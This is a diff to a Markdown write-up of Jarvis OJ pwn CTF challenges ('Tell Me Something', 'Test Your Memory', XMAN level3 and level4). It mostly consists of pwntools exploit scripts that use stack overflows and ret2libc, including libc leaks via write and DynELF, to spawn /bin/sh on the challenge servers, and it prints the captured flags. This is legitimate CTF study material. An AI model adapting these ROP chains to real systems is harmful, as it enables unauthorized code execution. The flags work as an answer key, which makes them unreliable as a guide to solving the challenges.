@@ -272,6 +272,38 @@
 
   
 
+* #### Tell Me Something 
+
+  ```python
+  from pwn import *
+  sh = remote("pwn.jarvisoj.com",9876)
+  payload = 'a'*136 + p64(0x0000000000400620) 
+  sh.recvuntil("message:\n")
+  sh.sendline(payload)
+  print(sh.recv())
+  #PCTF{This_is_J4st_Begin}
+  ```
+
+* #### Test Your Memory
+
+   ```python
+   from pwn import *
+   sh = remote("pwn2.jarvisoj.com",9876)
+   elf =ELF("./memory") 
+   win_func_addr = elf.symbols['win_func']
+   catFlag_addr = 0x080487E0
+   padding = 'a' * (0x13 + 0x4)
+   payload = padding
+   payload += p32(win_func_addr) + p32(0x08048677) + p32(catFlag_addr)
+   
+   sh.sendline(payload)
+   print(sh.recv())
+   print(sh.recv())
+   #CTF{332e294fb7aeeaf0e1c7703a29304343}
+   ```
+
+   
+
 * #### [XMAN]level0
 
   64位文件
@@ -359,48 +391,101 @@
 
   
 
+  
+
 * ####  [XMAN]level3
 
    ![21](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/21.png)
 
-  开了NX，给出libc，考虑ret2libc
+     开了NX，给出libc，考虑ret2libc
 
-  ![22](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/22.png)
+     ![22](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/22.png)
 
-  read处存在溢出
+     read处存在溢出
 
-  两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")
+     两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")	
 
-  ```python
-  # encoding:utf-8
-  from pwn import *
-  
-  r = remote("pwn2.jarvisoj.com",9879)
-  elf = ELF("./level3")
-  libc = ELF("./libc-2.19.so")
-  write_plt = elf.plt["write"]
-  libc_start_got = elf.got['__libc_start_main']
-  func = elf.symbols["vulnerable_function"]
-  system_libc = libc.symbols["system"]
-  binsh_libc = libc.search("/bin/sh").next()
-  libc_start_libc = libc.symbols["__libc_start_main"]
-  padding = 'a' * (0x88 + 0x4)
-  payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
-  r.recvuntil("Input:\n")
-  r.sendline(payload1)
-  
-  leak_addr = u32(r.recv(4))
-  libc_base = leak_addr - libc_start_libc
-  system_addr = libc_base + system_libc
-  binsh_addr = libc_base + binsh_libc
-  
-  payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
-  r.recvuntil("Input:\n")
-  r.sendline(payload2)
-  r.interactive()
-  #CTF{d85346df5770f56f69025bc3f5f1d3d0}
-  ```
+   ```python
+     from pwn import *
+     
+     r = remote("pwn2.jarvisoj.com",9879)
+     elf = ELF("./level3")
+     libc = ELF("./libc-2.19.so")
+     write_plt = elf.plt["write"]
+     libc_start_got = elf.got['__libc_start_main']
+     func = elf.symbols["vulnerable_function"]
+     system_libc = libc.symbols["system"]
+     binsh_libc = libc.search("/bin/sh").next()
+     libc_start_libc = libc.symbols["__libc_start_main"]
+     padding = 'a' * (0x88 + 0x4)
+     payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
+     r.recvuntil("Input:\n")
+     r.sendline(payload1)
+     
+     leak_addr = u32(r.recv(4))
+     libc_base = leak_addr - libc_start_libc
+     system_addr = libc_base + system_libc
+     binsh_addr = libc_base + binsh_libc
+     
+     payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
+     r.recvuntil("Input:\n")
+     r.sendline(payload2)
+     r.interactive()
+     #CTF{d85346df5770f56f69025bc3f5f1d3d0}
+   ```
 
-  
+   
 
-  
+* #### [XMAN]level4
+
+   ![23](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/23.png)
+
+    ![24](https://raw.githubusercontent.com/AiDaiP/AiDaiP.github.io/master/images/Jarvis%20OJ/24.png)
+
+   栈溢出，ret2libc
+
+   先通过write搞到system地址，没给出libc那就用DynELF
+
+   搞到地址之后再次溢出，先调用read在bss段写入/bin/sh，返回到system执行
+
+   ```python
+   from pwn import *
+   r = remote('pwn2.jarvisoj.com', 9880)
+   elf = ELF('./level4')
+   padding = 'a' * (0x88 + 0x4)
+   write_addr = elf.plt['write']
+   main_addr = elf.symbols['main']
+   read_addr = elf.plt['read']
+   
+   def leak(addr):
+   	payload = padding
+   	payload += p32(write_addr)
+   	payload += p32(main_addr)
+   	payload += p32(1) + p32(addr) + p32(4)
+   	r.sendline(payload)
+   	leak_addr = r.recv(4)
+   	return leak_addr
+   
+   d = DynELF(leak,elf = ELF('./level4'))
+   system_addr = d.lookup('system','libc')
+   print(hex(system_addr))
+   
+   bss_addr = elf.bss()
+   payload1 = padding
+   payload1 += p32(read_addr)
+   payload1 += p32(system_addr)
+   payload1 += p32(0) + p32(bss_addr) + p32(8)
+   payload1 += p32(bss_addr)
+   
+   r.sendline(payload1)
+   r.sendline('/bin/sh\0')
+   r.interactive()
+   #CTF{882130cf51d65fb705440b218e94e98e}
+   ```
+
+   
+
+* 
+
+
+
